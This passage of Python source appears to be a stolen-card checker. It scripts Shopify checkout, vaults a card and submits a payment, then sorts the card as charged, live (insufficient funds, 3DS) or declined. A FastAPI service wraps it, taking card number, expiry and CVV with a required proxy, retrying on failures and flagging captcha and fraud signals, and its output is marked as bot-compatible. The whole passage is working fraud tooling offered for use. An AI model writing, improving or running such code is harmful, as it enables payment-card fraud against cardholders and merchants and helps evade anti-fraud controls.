            body = _proposal_body(ses_tok, stable, variant, qt, email, None, cur, ctry)
            resp = send_proposal(client, shop, ck_url, ck_tok, ses_tok, build, src, prop_id, body)
            qt2 = _g("queue", resp)
            if not qt2:
                raise Exception("no queue")
        except Exception as e:
            result.retryable = True
            result.error = f"Step5: {e}"
            return result

        # Step 6 — country fallback
        addr = pick_addr(ctry)
        fallbacks = fallback_addrs(addr.country)
        final_body = None
        qt3 = None
        for attempt in range(1 + len(fallbacks)):
            body = _proposal_body(ses_tok, stable, variant, qt2, email, addr, cur, ctry)
            resp = send_proposal(client, shop, ck_url, ck_tok, ses_tok, build, src, prop_id, body)
            _qt = _g("queue", resp)
            if not _qt:
                raise Exception("no queue")
            low_r = resp.lower()
            shipping_blocked = any(s in low_r for s in [
                "shipping_address_undeliverable",
                "no_delivery_options_available",
                "does not ship to",
            ])
            if not shipping_blocked or attempt >= len(fallbacks):
                final_body = resp
                qt3 = _qt
                break
            addr = fallbacks[attempt]
            qt2 = _qt

        if not final_body:
            result.retryable = True
            result.error = "Step6: no shipping"
            return result

        # Step 7
        try:
            body = _proposal_body(ses_tok, stable, variant, qt3, email, addr, cur, ctry)
            resp4 = send_proposal(client, shop, ck_url, ck_tok, ses_tok, build, src, prop_id, body)
            qt4 = _g("queue", resp4)
            if not qt4:
                raise Exception("no queue")
        except Exception as e:
            result.retryable = True
            result.error = f"Step7: {e}"
            return result

        # Step 8
        try:
            body = _proposal_body(ses_tok, stable, variant, qt4, email, addr, cur, ctry)
            resp5 = send_proposal(client, shop, ck_url, ck_tok, ses_tok, build, src, prop_id, body)
            qt5 = _g("queue", resp5)
        except Exception as e:
            result.retryable = True
            result.error = f"Step8: {e}"
            return result

        delivery_handle = extract_delivery_handle_json(resp5)
        signed_handles = extract_signed_handles(resp5)
        shipping = extract_shipping(resp5)
        total = extract_total(resp5)
        tax = extract_tax(resp5)
        is_digital = is_digital_flow(resp5)

        if is_digital:
            total = extract_running_total(resp5) or total
            shipping = "0.00"
            delivery_handle = ""
            signed_handles = []

        if not total:
            result.retryable = True
            result.error = "no total"
            return result

        # Step 9 — PCI
        try:
            pci_id = vault_card(ident, card_num, f"{addr.first} {addr.last}", mes, ano, cvv,
                                vdom or shop, vault, proxy, profile)
            if not pci_id:
                raise Exception("no pci id")
        except Exception as e:
            result.retryable = True
            result.error = f"Step9: {e}"
            return result

        # Step 10 — submit
        attempt = f"{ck_tok}-{''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(10))}"
        try:
            submit_resp = submit_payment(
                client, shop, ck_url, ck_tok, ses_tok, build, src, submit_id,
                stable, variant, qt5 or "", email, addr, cur, ctry,
                pci_id, total, shipping, delivery_handle,
                signed_handles, tax, attempt,
            )
        except Exception as e:
            result.retryable = True
            result.error = f"Step10: {e}"
            return result

        receipt_id = _g("receipt_id", submit_resp)
        receipt_ses = _g("receipt_ses", submit_resp)

        if not receipt_id:
            err = any_error(submit_resp) or "SUBMIT_REJECTED"
            if "CAPTCHA" in err:
                result.status = CheckStatus.DECLINED
                result.status_code = "CAPTCHA_REQUIRED"
                result.error = "captcha"
            else:
                result.status = CheckStatus.DECLINED
                result.status_code = err
                result.error = err
                result.retryable = err in ("OUT_OF_STOCK", "RATE_LIMITED", "GENERIC_ERROR")
            return result

        if not receipt_ses:
            result.retryable = True
            result.error = "no receipt session"
            return result

        # ─────────────────────────────────────────────────────────────
        # Step 11 — STRICT CHARGE VERIFICATION
        # ─────────────────────────────────────────────────────────────
        for poll_num in range(1, 21):
            try:
                pr = poll_receipt(client, shop, ck_url, ck_tok, ses_tok, build, src,
                                  poll_id, receipt_id, receipt_ses)
                m = _R["receipt_ty"].search(pr)
                rtype = m.group(1) if m else ""

                if rtype in ("ProcessedReceipt", "SuccessfulReceipt"):
                    real_order, real_url = is_real_charge(pr)

                    if real_order:
                        # ★ REAL CHARGE ★
                        result.status = CheckStatus.CHARGED
                        result.status_code = "ORDER_PLACED"
                        result.amount = total
                        result.receipt_url = real_url or f"{shop.rstrip('/')}/orders"
                        return result

                    # No proof — keep polling, cap at 15
                    if poll_num < 15:
                        pass
                    else:
                        result.status = CheckStatus.APPROVED
                        result.status_code = "PAYMENT_PROCESSING"
                        result.amount = total
                        result.receipt_url = ""
                        return result

                if rtype == "ActionRequiredReceipt":
                    result.status = CheckStatus.APPROVED
                    result.status_code = "3DS_AUTHENTICATION"
                    result.amount = total
                    return result

                if rtype == "FailedReceipt":
                    m = _R["err_code"].search(pr)
                    code = m.group(1) if m else "FAILED"
                    if code == "INSUFFICIENT_FUNDS":
                        result.status = CheckStatus.APPROVED
                        result.status_code = "INSUFFICIENT_FUNDS"
                        result.amount = total
                        return result
                    if "CAPTCHA" in code:
                        result.status = CheckStatus.DECLINED
                        result.status_code = "CAPTCHA_REQUIRED"
                        return result
                    site_signals = ("fraud", "not supported", "risk", "shipping",
                                    "artifact", "transformer", "not available")
                    low = (code + " " + pr).lower()
                    if any(s in low for s in site_signals):
                        result.status = CheckStatus.ERROR
                        result.status_code = code
                        result.error = code
                        result.retryable = True
                        return result
                    result.status = CheckStatus.DECLINED
                    result.status_code = code or "CARD_DECLINED"
                    result.amount = total
                    return result

                m = _R["poll_delay"].search(pr)
                delay = min(int(m.group(1)), 3000) / 1000.0 if m else 0.5
                time.sleep(delay)
            except Exception as e:
                result.error = f"poll{poll_num}: {e}"
                result.retryable = True
                return result

        result.status = CheckStatus.ERROR
        result.error = "poll timeout"
        result.retryable = True
        return result

    finally:
        try:
            client.close()
        except Exception:
            pass


# ─────────────────────────── FastAPI layer ──────────────────────────────
_pool = concurrent.futures.ThreadPoolExecutor(max_workers=THREADS, thread_name_prefix="chk")
_active = 0
_lock = threading.Lock()

app = FastAPI(title="Shopify Checker API", version="3.0.0", docs_url=None, redoc_url=None)


class CheckReq(BaseModel):
    card: str
    shop_url: str
    proxy: str
    low: bool = True


class CheckResp(BaseModel):
    Response:    str  = "ERROR"
    Charged:     str  = "False"
    CC:          str  = ""
    Price:       str  = ""
    Gateway:     str  = "Shopify"     # ← bot-compatible
    Site:        str  = ""
    status_code: str  = ""
    error:       str  = ""
    retryable:   bool = False
    receipt_url: str  = ""


def _to_resp(r: CheckResult) -> CheckResp:
    s = r.status.name
    return CheckResp(
        Response    = s,
        Charged     = "True" if s == "CHARGED" else "False",
        CC          = r.card,
        Price       = r.amount,
        Gateway     = "Shopify",
        Site        = r.shop_url,
        status_code = r.status_code,
        error       = r.error,
        retryable   = r.retryable,
        receipt_url = r.receipt_url,
    )


async def _run(shop: str, card: str, proxy: str, low: bool) -> CheckResp:
    global _active
    loop = asyncio.get_running_loop()
    fn = functools.partial(run_checkout, shop, card, proxy, low)
    last = None

    for attempt in range(1 + RETRIES):
        with _lock:
            _active += 1
        try:
            res = await asyncio.wait_for(loop.run_in_executor(_pool, fn), timeout=120)
        except asyncio.TimeoutError:
            last = CheckResp(Response="ERROR", status_code="TIMEOUT",
                             error="checkout exceeded 120s", retryable=True)
            continue
        except Exception as e:
            last = CheckResp(Response="ERROR", status_code="EXCEPTION",
                             error=str(e)[:200], retryable=True)
            continue
        finally:
            with _lock:
                _active -= 1

        r = _to_resp(res)
        if not r.retryable or attempt >= RETRIES:
            return r
        last = r
    return last or CheckResp(Response="ERROR", error="unknown")


_DOCS = """<!doctype html><html><head><meta charset=utf-8><title>Shopify API</title>
<style>body{font:15px system-ui;background:#0b0b14;color:#e6e6ef;padding:40px;line-height:1.7;max-width:900px;margin:auto}
h1{color:#a78bfa}code{background:#1a1a2a;padding:2px 6px;border-radius:4px;font-size:13px}
.card{background:#12121f;border:1px solid #23233a;border-radius:10px;padding:20px;margin:14px 0}
pre{background:#0a0a14;padding:14px;border-radius:8px;overflow-x:auto;font-size:12px;color:#c4b5fd}
.ok{color:#34d399}.warn{color:#fbbf24}</style></head><body>
<h1>Shopify Checker API v3.0.0</h1>
<p>Returns <span class=ok>CHARGED</span> only when Shopify confirms a <b>real order</b> (with a /orders/ URL or Order GID).</p>
<p><span class=warn>ProcessedReceipt</span> without order proof is reported as <b>APPROVED / PAYMENT_PROCESSING</b> — not CHARGED.</p>
<div class=card><b>GET /health</b><pre>curl /health</pre></div>
<div class=card><b>GET /check</b><pre>curl "/check?url=shop.com&card=NUM|MM|YYYY|CVV&proxy=USER:PASS@HOST:PORT"</pre></div>
<div class=card><b>POST /check</b><pre>curl -X POST /check -H "Content-Type: application/json" -d '{"card":"...","shop_url":"...","proxy":"...","low":true}'</pre></div>
</body></html>"""


@app.get("/", include_in_schema=False)
async def root():
    return HTMLResponse(_DOCS)


@app.get("/docs", include_in_schema=False)
async def docs():
    return HTMLResponse(_DOCS)


@app.get("/health")
async def health():
    with _lock:
        a = _active
    return {"ok": True, "threads": THREADS, "retries": RETRIES, "active": a, "version": "3.0.0"}


@app.get("/check", response_model=CheckResp, response_model_exclude_none=True)
async def check_get(
    url: str = Query(..., description="Shop URL"),
    card: str = Query(..., description="NUM|MM|YYYY|CVV"),
    proxy: str = Query("", description="host:port:user:pass or http://user:pass@host:port"),
    low: str = Query("true"),
):
    if not card or "|" not in card:
        return CheckResp(Response="ERROR", status_code="CARD_INVALID",
                         error="format NUM|MM|YYYY|CVV")
    if not url:
        return CheckResp(Response="ERROR", status_code="URL_REQUIRED", error="url required")
    if not proxy:
        return CheckResp(Response="ERROR", status_code="PROXY_REQUIRED", error="proxy required")
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return await _run(url.rstrip("/"), card.strip(), proxy.strip(),
                      low.lower() in ("1", "true", "yes"))


@app.post("/check", response_model=CheckResp, response_model_exclude_none=True)
async def check_post(req: CheckReq):
    if not req.card or "|" not in req.card:
        return CheckResp(Response="ERROR", status_code="CARD_INVALID",
                         error="format NUM|MM|YYYY|CVV")
    if not req.shop_url:
        return CheckResp(Response="ERROR", status_code="URL_REQUIRED", error="url required")
    if not req.proxy:
        return CheckResp(Response="ERROR", status_code="PROXY_REQUIRED", error="proxy required")
    u = req.shop_url
    if not u.startswith(("http://", "https://")):
        u = "https://" + u
    return await _run(u.rstrip("/"), req.card.strip(), req.proxy.strip(), req.low)


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8000)), log_level="warning")
